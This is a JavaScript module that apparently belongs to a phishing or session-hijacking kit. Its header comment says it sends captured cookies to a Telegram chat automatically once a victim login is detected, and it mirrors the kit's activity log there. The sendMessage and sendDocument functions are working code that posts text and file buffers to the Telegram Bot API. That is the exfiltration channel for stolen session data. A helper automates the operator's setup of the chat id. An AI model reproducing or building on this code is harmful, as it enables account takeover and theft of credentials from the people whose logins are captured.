// Telegram bot integration — mirrors the live activity log and sends
// cookies automatically once a login is detected. Entirely optional and
// best-effort: every export here is a silent no-op (and never throws) when
// TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID aren't configured, or when Telegram
// itself is unreachable, so the rest of the app never depends on it.

import { config } from './config.js';

function apiUrl(method) {
  return `https://api.telegram.org/bot${config.telegramBotToken}/${method}`;
}

export function isEnabled() {
  return Boolean(config.telegramBotToken && config.telegramChatId);
}

export async function sendMessage(text, options) {
  if (!isEnabled()) return;
  var body = { chat_id: config.telegramChatId, text, disable_web_page_preview: true };
  if (options && options.parseMode) body.parse_mode = options.parseMode;
  try {
    await fetch(apiUrl('sendMessage'), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch {
    /* best-effort notification */
  }
}

export async function sendDocument(buffer, filename, caption) {
  if (!isEnabled()) return;
  try {
    const boundary = '----spBoundary' + Date.now().toString(16);
    const parts = [];
    const text = (s) => parts.push(Buffer.from(s, 'utf8'));
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${config.telegramChatId}\r\n`);
    if (caption) {
      text(`--${boundary}\r\n`);
      text(`Content-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`);
    }
    text(`--${boundary}\r\n`);
    text(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
    text(`Content-Type: application/octet-stream\r\n\r\n`);
    parts.push(buffer);
    text(`\r\n--${boundary}--\r\n`);
    await fetch(apiUrl('sendDocument'), {
      method: 'POST',
      headers: { 'content-type': `multipart/form-data; boundary=${boundary}` },
      body: Buffer.concat(parts),
    });
  } catch {
    /* best-effort */
  }
}

// One-off setup helper: finds the chat_id of whoever most recently messaged
// the bot, so the operator doesn't have to dig a numeric id out by hand.
export async function discoverChatId() {
  const res = await fetch(apiUrl('getUpdates') + '?limit=1&offset=-1');
  const data = await res.json();
  const upd = data.result?.[data.result.length - 1];
  return upd?.message?.chat?.id ?? upd?.channel_post?.chat?.id ?? null;
}
